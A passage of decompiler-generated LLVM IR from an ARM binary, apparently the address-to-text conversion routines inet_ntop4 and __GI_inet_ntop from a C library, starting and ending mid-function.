  %v1_1f3e0 = add i32 %v0_1f3e0, 1
  store i32 %v1_1f3e0, i32* %r0.global-to-local, align 4
  %v1_1f3e8 = or i32 %v3_1f3d8, 48
  store i32 %v1_1f3e8, i32* %r1.global-to-local, align 4
  %v1_1f3ec = trunc i32 %v1_1f3e8 to i8
  %v3_1f3ec = add i32 %v2_1f3e4, %v0_1f3e0
  %v4_1f3ec = inttoptr i32 %v3_1f3ec to i8*
  store i8 %v1_1f3ec, i8* %v4_1f3ec, align 1
  %v0_1f3f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1f3f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1f3f0 = add i32 %v1_1f3f0, %v0_1f3f0
  %v3_1f3f8 = add i32 %v2_1f3f0, -17
  %v4_1f3f8 = inttoptr i32 %v3_1f3f8 to i8*
  store i8 46, i8* %v4_1f3f8, align 1
  %v0_1f3fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1f3fc = add i32 %v0_1f3fc, 1
  store i32 %v1_1f3fc, i32* %r6.global-to-local, align 4
  %v0_1f400 = load i32, i32* %sl.global-to-local, align 4
  %v1_1f400 = add i32 %v0_1f400, 1
  store i32 %v1_1f400, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1f404

dec_label_pc_1f404:                               ; preds = %entry, %dec_label_pc_1f3d0
  %v0_1f410 = phi i32 [ 0, %entry ], [ %v1_1f3fc, %dec_label_pc_1f3d0 ]
  %v1_1f354 = phi i32 [ 0, %entry ], [ %v1_1f400, %dec_label_pc_1f3d0 ]
  store i32 %v2_1f404, i32* %ip.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_1f410, i32* %r7.global-to-local, align 4
  %v2_1f414 = add i32 %v0_1f410, %v2_1f404
  store i32 %v2_1f414, i32* %r5.global-to-local, align 4
  %v7_1f418 = icmp sgt i32 %v1_1f354, 3
  br i1 %v7_1f418, label %dec_label_pc_1f41c, label %dec_label_pc_1f354

dec_label_pc_1f41c:                               ; preds = %dec_label_pc_1f404
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1f420 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_1f420, i32* %r4.global-to-local, align 4
  %v3_1f424 = add i32 %v2_1f414, -18
  %v4_1f424 = inttoptr i32 %v3_1f424 to i8*
  store i8 0, i8* %v4_1f424, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_1f420, i32* %r0.global-to-local, align 4
  %v3_1f42c = call i32 @strlen(i8* %tmp20)
  store i32 %v3_1f42c, i32* %r0.global-to-local, align 4
  %v2_1f430 = load i32, i32* %stack_var_-72, align 4
  %tmp = icmp ugt i32 %v3_1f42c, %v2_1f430
  br i1 %tmp, label %dec_label_pc_1f43c, label %dec_label_pc_1f458

dec_label_pc_1f43c:                               ; preds = %dec_label_pc_1f41c
  %v0_1f440 = call i32 @__aeabi_read_tp()
  store i32 %v0_1f440, i32* %r0.global-to-local, align 4
  %v3_1f444 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1f444 = sext i16 %v3_1f444 to i32
  %v0_1f44c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1f44c, i32* %r1.global-to-local, align 4
  %v3_1f450 = add i32 %v4_1f444, %v0_1f440
  %v4_1f450 = inttoptr i32 %v3_1f450 to i32*
  store i32 28, i32* %v4_1f450, align 4
  %v0_1f468.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1f468

dec_label_pc_1f458:                               ; preds = %dec_label_pc_1f41c
  store i32 %v2_1f420, i32* @r1, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_1f460 = inttoptr i32 %arg2 to i8*
  %v3_1f460 = call i32 @strcpy(i8* %v2_1f460, i32 %v2_1f420)
  store i32 %v3_1f460, i32* %r0.global-to-local, align 4
  store i32 %v3_1f460, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1f468

dec_label_pc_1f468:                               ; preds = %dec_label_pc_1f43c, %dec_label_pc_1f458
  %v0_1f468 = phi i32 [ %v0_1f468.pre, %dec_label_pc_1f43c ], [ %v3_1f460, %dec_label_pc_1f458 ]
  store i32 %v0_1f468, i32* %r0.global-to-local, align 4
  ret i32 %v0_1f468

; uselistorder directives
  uselistorder i32 %v0_1f468, { 1, 0 }
  uselistorder i32 %v2_1f420, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1f414, { 0, 2, 1 }
  uselistorder i32 %v1_1f354, { 1, 0 }
  uselistorder i32 %v1_1f3e8, { 1, 0 }
  uselistorder i32 %v1_1f39c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1f404, { 0, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 100, { 1, 2, 0, 3 }
  uselistorder i8 48, { 5, 0, 3, 6, 7, 8, 9, 10, 1, 2, 11, 4 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1f468, { 1, 0 }
  uselistorder label %dec_label_pc_1f404, { 1, 0 }
  uselistorder label %dec_label_pc_1f3d0, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_1f47c = load i32, i32* @r5, align 4
  %v7_1f488 = icmp eq i32 %arg1, 2
  store i1 %v7_1f488, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_1f488, label %dec_label_pc_1f4ac, label %dec_label_pc_1f4a0

dec_label_pc_1f4a0:                               ; preds = %entry
  %v7_1f4a0 = icmp eq i32 %arg1, 10
  store i1 %v7_1f4a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f4a0, label %dec_label_pc_1f4c0, label %dec_label_pc_1f6dc

dec_label_pc_1f4ac:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_1f4b8 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1f6d4

dec_label_pc_1f4c0:                               ; preds = %dec_label_pc_1f4a0
  %v2_1f4c0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1f4c0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1f4cc = bitcast i32* %stack_var_-72 to i8*
  %v4_1f4cc = call i32 @__GI_memset(i8* %v3_1f4cc, i32 0, i32 32)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1f4f0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1f4d4

dec_label_pc_1f4d4:                               ; preds = %dec_label_pc_1f4d4.dec_label_pc_1f4d4_crit_edge, %dec_label_pc_1f4c0
  %v0_1f4ec = phi i32 [ %v0_1f4d4.pre, %dec_label_pc_1f4d4.dec_label_pc_1f4d4_crit_edge ], [ 0, %dec_label_pc_1f4c0 ]
  %v1_1f4d4 = load i32, i32* @r8, align 4
  %v2_1f4d4 = add i32 %v1_1f4d4, %v0_1f4ec
  %v3_1f4d8 = inttoptr i32 %v2_1f4d4 to i8*
  %v4_1f4d8 = load i8, i8* %v3_1f4d8, align 1
  %v6_1f4d8 = zext i8 %v4_1f4d8 to i32
  store i32 %v6_1f4d8, i32* %r1.global-to-local, align 4
  %v1_1f4dc = add i32 %v2_1f4d4, 1
  %v2_1f4dc = inttoptr i32 %v1_1f4dc to i8*
  %v3_1f4dc = load i8, i8* %v2_1f4dc, align 1
  %v4_1f4dc = zext i8 %v3_1f4dc to i32
  %tmp74 = icmp slt i32 %v0_1f4ec, 0
  %v4_1f4e0 = zext i1 %tmp74 to i32
  %v5_1f4e0 = add i32 %v4_1f4e0, %v0_1f4ec
  %v4_1f4e4 = mul nuw nsw i32 %v6_1f4d8, 256
  %v5_1f4e4 = or i32 %v4_1f4dc, %v4_1f4e4
  %v3_1f4e8 = sdiv i32 %v5_1f4e0, 2
  %v1_1f4ec = add i32 %v0_1f4ec, 2
  store i32 %v1_1f4ec, i32* %r0.global-to-local, align 4
  store i32 %v2_1f4f0, i32* %r1.global-to-local, align 4
  %v4_1f4f4 = mul i32 %v3_1f4e8, 4
  %v5_1f4f4 = add i32 %v4_1f4f4, %v2_1f4f0
  %v7_1f4f8 = icmp eq i32 %v1_1f4ec, 15
  store i1 %v7_1f4f8, i1* %cpsr_z.global-to-local, align 1
  %v2_1f4fc = add i32 %v5_1f4f4, -32
  %v3_1f4fc = inttoptr i32 %v2_1f4fc to i32*
  store i32 %v5_1f4e4, i32* %v3_1f4fc, align 4
  %v7_1f500 = icmp sgt i32 %v1_1f4ec, 15
  br i1 %v7_1f500, label %dec_label_pc_1f504, label %dec_label_pc_1f4d4.dec_label_pc_1f4d4_crit_edge

dec_label_pc_1f4d4.dec_label_pc_1f4d4_crit_edge:  ; preds = %dec_label_pc_1f4d4
  %v0_1f4d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1f4d4

dec_label_pc_1f504:                               ; preds = %dec_label_pc_1f4d4
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1f51c

dec_label_pc_1f51c:                               ; preds = %dec_label_pc_1f504, %dec_label_pc_1f568
  %v0_1f55c = phi i32 [ -1, %dec_label_pc_1f504 ], [ %v0_1f590, %dec_label_pc_1f568 ]
  %v0_1f54c = phi i32 [ -1, %dec_label_pc_1f504 ], [ %v0_1f57c, %dec_label_pc_1f568 ]
  %v0_1f530 = phi i32 [ -1, %dec_label_pc_1f504 ], [ %v0_1f5307, %dec_label_pc_1f568 ]
  %v0_1f568 = phi i32 [ 0, %dec_label_pc_1f504 ], [ %v1_1f568, %dec_label_pc_1f568 ]
  %v4_1f520 = mul nuw nsw i32 %v0_1f568, 4
  %v5_1f520 = add i32 %v4_1f520, %v2_1f4f0
  %v1_1f524 = add i32 %v5_1f520, -32
  %v2_1f524 = inttoptr i32 %v1_1f524 to i32*
  %v3_1f524 = load i32, i32* %v2_1f524, align 4
  %v2_1f528 = icmp eq i32 %v3_1f524, 0
  %v7_1f530 = icmp eq i32 %v0_1f530, -1
  br i1 %v2_1f528, label %dec_label_pc_1f530, label %dec_label_pc_1f544

dec_label_pc_1f530:                               ; preds = %dec_label_pc_1f51c
  br i1 %v7_1f530, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1f530
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1f568

.thread:                                          ; preds = %dec_label_pc_1f530
  %v1_1f53c.pre = load i32, i32* @r4, align 4
  %v2_1f53c = add i32 %v1_1f53c.pre, 1
  store i32 %v2_1f53c, i32* @r4, align 4
  br label %dec_label_pc_1f568

dec_label_pc_1f544:                               ; preds = %dec_label_pc_1f51c
  br i1 %v7_1f530, label %dec_label_pc_1f568, label %dec_label_pc_1f54c

dec_label_pc_1f54c:                               ; preds = %dec_label_pc_1f544
  %v7_1f54c = icmp eq i32 %v0_1f54c, -1
  %v0_1f560.pre = load i32, i32* @r4, align 4
  %v1_1f554 = load i32, i32* @r7, align 4
  %v7_1f558 = icmp sgt i32 %v0_1f560.pre, %v1_1f554
  %or.cond = or i1 %v7_1f54c, %v7_1f558
  br i1 %or.cond, label %dec_label_pc_1f55c, label %dec_label_pc_1f564

dec_label_pc_1f55c:                               ; preds = %dec_label_pc_1f54c
  store i32 %v0_1f55c, i32* @r6, align 4
  store i32 %v0_1f560.pre, i32* @r7, align 4
  br label %dec_label_pc_1f564

dec_label_pc_1f564:                               ; preds = %dec_label_pc_1f54c, %dec_label_pc_1f55c
  %v0_1f54c12 = phi i32 [ %v0_1f55c, %dec_label_pc_1f55c ], [ %v0_1f54c, %dec_label_pc_1f54c ]
  br label %dec_label_pc_1f568

dec_label_pc_1f568:                               ; preds = %bb, %.thread, %dec_label_pc_1f544, %dec_label_pc_1f564
  %v0_1f590 = phi i32 [ %v0_1f55c, %.thread ], [ %v0_1f568, %bb ], [ %v0_1f55c, %dec_label_pc_1f544 ], [ -1, %dec_label_pc_1f564 ]
  %v0_1f5307 = phi i32 [ %v0_1f530, %.thread ], [ %v0_1f568, %bb ], [ -1, %dec_label_pc_1f544 ], [ -1, %dec_label_pc_1f564 ]
  %v0_1f57c = phi i32 [ %v0_1f54c, %.thread ], [ %v0_1f54c, %bb ], [ %v0_1f54c, %dec_label_pc_1f544 ], [ %v0_1f54c12, %dec_label_pc_1f564 ]
  %v1_1f568 = add nuw nsw i32 %v0_1f568, 1
  store i32 %v1_1f568, i32* %r1.global-to-local, align 4
  %v7_1f570 = icmp slt i32 %v1_1f568, 8
  br i1 %v7_1f570, label %dec_label_pc_1f51c, label %dec_label_pc_1f574

dec_label_pc_1f574:                               ; preds = %dec_label_pc_1f568
  %v7_1f574 = icmp eq i32 %v0_1f590, -1
  store i1 %v7_1f574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f574, label %dec_label_pc_1f574.dec_label_pc_1f594_crit_edge, label %dec_label_pc_1f57c

dec_label_pc_1f574.dec_label_pc_1f594_crit_edge:  ; preds = %dec_label_pc_1f574
  %v1_1f5b8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1f594

dec_label_pc_1f57c:                               ; preds = %dec_label_pc_1f574
  %v7_1f57c = icmp eq i32 %v0_1f57c, -1
  store i1 %v7_1f57c, i1* %cpsr_z.global-to-local, align 1
  %v0_1f58c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1f57c, label %dec_label_pc_1f58c, label %dec_label_pc_1f584

dec_label_pc_1f584:                               ; preds = %dec_label_pc_1f57c
  %v1_1f584 = load i32, i32* @r7, align 4
  %v9_1f584 = icmp eq i32 %v0_1f58c.pre, %v1_1f584
  store i1 %v9_1f584, i1* %cpsr_z.global-to-local, align 1
  %v7_1f588 = icmp sgt i32 %v0_1f58c.pre, %v1_1f584
  br i1 %v7_1f588, label %dec_label_pc_1f58c, label %dec_label_pc_1f594

dec_label_pc_1f58c:                               ; preds = %dec_label_pc_1f57c, %dec_label_pc_1f584
  store i32 %v0_1f58c.pre, i32* @r7, align 4
  store i32 %v0_1f590, i32* @r6, align 4
  br label %dec_label_pc_1f594

dec_label_pc_1f594:                               ; preds = %dec_label_pc_1f574.dec_label_pc_1f594_crit_edge, %dec_label_pc_1f584, %dec_label_pc_1f58c
  %v1_1f5b8.pre = phi i32 [ %v1_1f584, %dec_label_pc_1f584 ], [ %v1_1f5b8.pre.pre, %dec_label_pc_1f574.dec_label_pc_1f594_crit_edge ], [ %v0_1f58c.pre, %dec_label_pc_1f58c ]
  %v0_1f594 = phi i32 [ %v0_1f57c, %dec_label_pc_1f584 ], [ %v0_1f57c, %dec_label_pc_1f574.dec_label_pc_1f594_crit_edge ], [ %v0_1f590, %dec_label_pc_1f58c ]
  %v7_1f594 = icmp eq i32 %v0_1f594, -1
  store i1 %v7_1f594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f594, label %dec_label_pc_1f594._crit_edge, label %dec_label_pc_1f59c

dec_label_pc_1f59c:                               ; preds = %dec_label_pc_1f594
  %v7_1f59c = icmp eq i32 %v1_1f5b8.pre, 1
  store i1 %v7_1f59c, i1* %cpsr_z.global-to-local, align 1
  %v7_1f5a0 = icmp slt i32 %v1_1f5b8.pre, 2
  br i1 %v7_1f5a0, label %bb54, label %dec_label_pc_1f594._crit_edge

bb54:                                             ; preds = %dec_label_pc_1f59c
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1f594._crit_edge

dec_label_pc_1f594._crit_edge:                    ; preds = %dec_label_pc_1f594, %dec_label_pc_1f59c, %bb54
  %v0_1f5b8 = phi i32 [ %v0_1f594, %dec_label_pc_1f59c ], [ -1, %bb54 ], [ %v0_1f594, %dec_label_pc_1f594 ]
  %v2_1f5a8 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_1f5a8, i32* @r4, align 4
  %v0_1f5ac = load i32, i32* @r5, align 4
  %v2_1f5ac = add i32 %v0_1f5ac, -34652
  store i32 %v2_1f5ac, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_1f5b8 = add i32 %v0_1f5b8, %v1_1f5b8.pre
  store i32 %v2_1f5b8, i32* @sl, align 4
  %v9_1f618 = icmp eq i32 %tmp, 65535
  %v7_1f5c068 = icmp eq i32 %v0_1f5b8, -1
  store i1 %v7_1f5c068, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1f5c0

dec_label_pc_1f5c0:                               ; preds = %dec_label_pc_1f594._crit_edge, %dec_label_pc_1f670
  %v7_1f5c072 = phi i1 [ %v7_1f5c068, %dec_label_pc_1f594._crit_edge ], [ %v7_1f5c0, %dec_label_pc_1f670 ]
  %v0_1f5ec71 = phi i32 [ 0, %dec_label_pc_1f594._crit_edge ], [ %v1_1f670, %dec_label_pc_1f670 ]
  %v1_1f5d870 = phi i32 [ %v0_1f5b8, %dec_label_pc_1f594._crit_edge ], [ %v0_1f5c0.pre, %dec_label_pc_1f670 ]
  %v2_1f5f069 = phi i32 [ %v2_1f5a8, %dec_label_pc_1f594._crit_edge ], [ %v3_1f5dc29, %dec_label_pc_1f670 ]
  br i1 %v7_1f5c072, label %dec_label_pc_1f5e4, label %dec_label_pc_1f5c8

dec_label_pc_1f5c8:                               ; preds = %dec_label_pc_1f5c0
  %v9_1f5c8 = icmp eq i32 %v0_1f5ec71, %v1_1f5d870
  store i1 %v9_1f5c8, i1* %cpsr_z.global-to-local, align 1
  %v5_1f5cc = icmp slt i32 %v0_1f5ec71, %v1_1f5d870
  br i1 %v5_1f5cc, label %dec_label_pc_1f5e4, label %dec_label_pc_1f5d0

dec_label_pc_1f5d0:                               ; preds = %dec_label_pc_1f5c8
  %v1_1f5d0 = load i32, i32* @sl, align 4
  %v9_1f5d0 = icmp eq i32 %v0_1f5ec71, %v1_1f5d0
  store i1 %v9_1f5d0, i1* %cpsr_z.global-to-local, align 1
  %v6_1f5d4 = icmp slt i32 %v0_1f5ec71, %v1_1f5d0
  br i1 %v6_1f5d4, label %dec_label_pc_1f5d8, label %dec_label_pc_1f5e4

dec_label_pc_1f5d8:                               ; preds = %dec_label_pc_1f5d0
  store i1 %v9_1f5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1f5c8, label %bb56, label %dec_label_pc_1f670

bb56:                                             ; preds = %dec_label_pc_1f5d8
  %v1_1f5dc = load i32, i32* @sb, align 4
  %v2_1f5dc = trunc i32 %v1_1f5dc to i8
  %v4_1f5dc = inttoptr i32 %v2_1f5f069 to i8*
  store i8 %v2_1f5dc, i8* %v4_1f5dc, align 1
  %v5_1f5dc = load i32, i32* @r4, align 4
  %v6_1f5dc = add i32 %v5_1f5dc, 1
  store i32 %v6_1f5dc, i32* @r4, align 4
  br label %dec_label_pc_1f670

dec_label_pc_1f5e4:                               ; preds = %dec_label_pc_1f5d0, %dec_label_pc_1f5c8, %dec_label_pc_1f5c0
  %v2_1f5e4 = icmp eq i32 %v0_1f5ec71, 0
  store i1 %v2_1f5e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f5e4, label %dec_label_pc_1f654, label %dec_label_pc_1f5ec

dec_label_pc_1f5ec:                               ; preds = %dec_label_pc_1f5e4
  %v7_1f5ec = icmp eq i32 %v0_1f5ec71, 6
  store i1 %v7_1f5ec, i1* %cpsr_z.global-to-local, align 1
  %v0_1f5f0 = load i32, i32* @sb, align 4
  %v1_1f5f0 = trunc i32 %v0_1f5f0 to i8
  %v3_1f5f0 = inttoptr i32 %v2_1f5f069 to i8*
  store i8 %v1_1f5f0, i8* %v3_1f5f0, align 1
  %v4_1f5f0 = load i32, i32* @r4, align 4
  %v5_1f5f0 = add i32 %v4_1f5f0, 1
  store i32 %v5_1f5f0, i32* @r4, align 4
  %v0_1f5f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1f5f4, label %dec_label_pc_1f5f8, label %dec_label_pc_1f654

dec_label_pc_1f5f8:                               ; preds = %dec_label_pc_1f5ec
  %v0_1f5f8 = load i32, i32* @r6, align 4
  %v2_1f5f8 = icmp eq i32 %v0_1f5f8, 0
  store i1 %v2_1f5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f5f8, label %dec_label_pc_1f600, label %dec_label_pc_1f654

dec_label_pc_1f600:                               ; preds = %dec_label_pc_1f5f8
  %v0_1f600 = load i32, i32* @r7, align 4
  %v7_1f600 = icmp eq i32 %v0_1f600, 6
  store i1 %v7_1f600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f600, label %dec_label_pc_1f620, label %dec_label_pc_1f608

dec_label_pc_1f608:                               ; preds = %dec_label_pc_1f600
  %v7_1f608 = icmp eq i32 %v0_1f600, 5
  store i1 %v7_1f608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f608, label %dec_label_pc_1f610, label %dec_label_pc_1f654

dec_label_pc_1f610:                               ; preds = %dec_label_pc_1f608
  store i32 65535, i32* %r1.global-to-local, align 4
  store i1 %v9_1f618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1f618, label %dec_label_pc_1f620, label %dec_label_pc_1f654

dec_label_pc_1f620:                               ; preds = %dec_label_pc_1f610, %dec_label_pc_1f600
  %v2_1f624 = sub i32 %v2_1f4f0, %v5_1f5f0
  store i32 %v5_1f5f0, i32* %r1.global-to-local, align 4
  %v0_1f62c = load i32, i32* @r8, align 4
  %v1_1f62c = add i32 %v0_1f62c, 12
  store i32 %v1_1f62c, i32* %r0.global-to-local, align 4
  %v1_1f630 = add i32 %v2_1f624, -32
  %v3_1f634 = call i32 @inet_ntop4(i32 %v1_1f62c, i32 %v5_1f5f0, i32 %v1_1f630)
  store i32 %v3_1f634, i32* %r0.global-to-local, align 4
  %v2_1f638 = icmp eq i32 %v3_1f634, 0
  store i1 %v2_1f638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f638, label %bb57, label %dec_label_pc_1f644

bb57:                                             ; preds = %dec_label_pc_1f620
  %v1_1f63c = load i32, i32* @r6, align 4
  store i32 %v1_1f63c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1f6f4

dec_label_pc_1f644:                               ; preds = %dec_label_pc_1f620
  %v0_1f644 = load i32, i32* @r4, align 4
  %v1_1f644 = inttoptr i32 %v0_1f644 to i8*
  store i32 %v0_1f644, i32* %r0.global-to-local, align 4
  %v3_1f648 = call i32 @strlen(i8* %v1_1f644)
  store i32 %v3_1f648, i32* %r0.global-to-local, align 4
  %v0_1f64c = load i32, i32* @r4, align 4
  %v2_1f64c = add i32 %v0_1f64c, %v3_1f648
  store i32 %v2_1f64c, i32* @r4, align 4
  %v0_1f684.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1f684

dec_label_pc_1f654:                               ; preds = %dec_label_pc_1f610, %dec_label_pc_1f608, %dec_label_pc_1f5f8, %dec_label_pc_1f5ec, %dec_label_pc_1f5e4
  %v0_1f65c = phi i32 [ %v5_1f5f0, %dec_label_pc_1f610 ], [ %v5_1f5f0, %dec_label_pc_1f608 ], [ %v5_1f5f0, %dec_label_pc_1f5f8 ], [ %v5_1f5f0, %dec_label_pc_1f5ec ], [ %v2_1f5f069, %dec_label_pc_1f5e4 ]
  store i32 %v2_1f4f0, i32* @lr, align 4
  store i32 %v0_1f65c, i32* @r0, align 4
  %v0_1f664 = load i32, i32* @fp, align 4
  store i32 %v0_1f664, i32* %r1.global-to-local, align 4
  %v2_1f668 = call i32 @sprintf(i32 %v0_1f65c, i32 %v0_1f664)
  store i32 %v2_1f668, i32* %r0.global-to-local, align 4
  %v0_1f66c = load i32, i32* @r4, align 4
  %v2_1f66c = add i32 %v0_1f66c, %v2_1f668
  store i32 %v2_1f66c, i32* @r4, align 4
  br label %dec_label_pc_1f670

dec_label_pc_1f670:                               ; preds = %bb56, %dec_label_pc_1f5d8, %dec_label_pc_1f654
  %v3_1f5dc29 = phi i32 [ %v6_1f5dc, %bb56 ], [ %v2_1f5f069, %dec_label_pc_1f5d8 ], [ %v2_1f66c, %dec_label_pc_1f654 ]
  %v0_1f670 = load i32, i32* @r5, align 4
  %v1_1f670 = add i32 %v0_1f670, 1
  store i32 %v1_1f670, i32* @r5, align 4
  %v0_1f5c0.pre = load i32, i32* @r6, align 4
  %v7_1f678 = icmp slt i32 %v1_1f670, 8
  %v7_1f5c0 = icmp eq i32 %v0_1f5c0.pre, -1
  store i1 %v7_1f5c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f678, label %dec_label_pc_1f5c0, label %dec_label_pc_1f67c

dec_label_pc_1f67c:                               ; preds = %dec_label_pc_1f670
  br i1 %v7_1f5c0, label %.thread2, label %dec_label_pc_1f684

dec_label_pc_1f684:                               ; preds = %dec_label_pc_1f67c, %dec_label_pc_1f644
  %v3_1f690 = phi i32 [ %v3_1f5dc29, %dec_label_pc_1f67c ], [ %v2_1f64c, %dec_label_pc_1f644 ]
  %v0_1f684 = phi i32 [ %v0_1f5c0.pre, %dec_label_pc_1f67c ], [ %v0_1f684.pre, %dec_label_pc_1f644 ]
  %v1_1f684 = load i32, i32* @r7, align 4
  %v2_1f684 = add i32 %v1_1f684, %v0_1f684
  %v7_1f688 = icmp eq i32 %v2_1f684, 8
  store i1 %v7_1f688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f688, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1f684
  %v4_1f690 = inttoptr i32 %v3_1f690 to i8*
  store i8 58, i8* %v4_1f690, align 1
  %v5_1f690 = load i32, i32* @r4, align 4
  %v6_1f690 = add i32 %v5_1f690, 1
  store i32 %v6_1f690, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1f684, %dec_label_pc_1f67c, %bb58
  %v2_1f698 = phi i32 [ %v3_1f690, %dec_label_pc_1f684 ], [ %v3_1f5dc29, %dec_label_pc_1f67c ], [ %v6_1f690, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1f698 = inttoptr i32 %v2_1f698 to i8*
  store i8 0, i8* %v3_1f698, align 1
  %v4_1f698 = load i32, i32* @r4, align 4
  %v5_1f698 = add i32 %v4_1f698, 1
  store i32 %v2_1f5a8, i32* @r1, align 4
  %v2_1f6a0 = load i32, i32* %stack_var_-128, align 4
  %v2_1f6a4 = sub i32 %v5_1f698, %v2_1f5a8
  %v9_1f6a8 = icmp eq i32 %v2_1f6a4, %v2_1f6a0
  store i1 %v9_1f6a8, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_1f6a4, %v2_1f6a0
  br i1 %tmp75, label %dec_label_pc_1f6b0, label %dec_label_pc_1f6cc

dec_label_pc_1f6b0:                               ; preds = %.thread2
  %v0_1f6b4 = call i32 @__aeabi_read_tp()
  store i32 %v0_1f6b4, i32* %r0.global-to-local, align 4
  %v3_1f6b8 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1f6b8 = sext i16 %v3_1f6b8 to i32
  %v0_1f6c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1f6c0, i32* %r1.global-to-local, align 4
  %v3_1f6c4 = add i32 %v4_1f6b8, %v0_1f6b4
  %v4_1f6c4 = inttoptr i32 %v3_1f6c4 to i32*
  store i32 28, i32* %v4_1f6c4, align 4
  %v0_1f6f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1f6f4

dec_label_pc_1f6cc:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1f6d0 = inttoptr i32 %arg3 to i8*
  %v3_1f6d0 = call i32 @strcpy(i8* %v2_1f6d0, i32 %v2_1f5a8)
  br label %dec_label_pc_1f6d4

dec_label_pc_1f6d4:                               ; preds = %dec_label_pc_1f4ac, %dec_label_pc_1f6cc
  %storemerge = phi i32 [ %v3_1f4b8, %dec_label_pc_1f4ac ], [ %v3_1f6d0, %dec_label_pc_1f6cc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1f6f4

dec_label_pc_1f6dc:                               ; preds = %dec_label_pc_1f4a0
  %v0_1f6e0 = call i32 @__aeabi_read_tp()
  store i32 %v0_1f6e0, i32* %r0.global-to-local, align 4
  %v3_1f6e4 = load i16, i16* @global_var_32088.1320, align 2
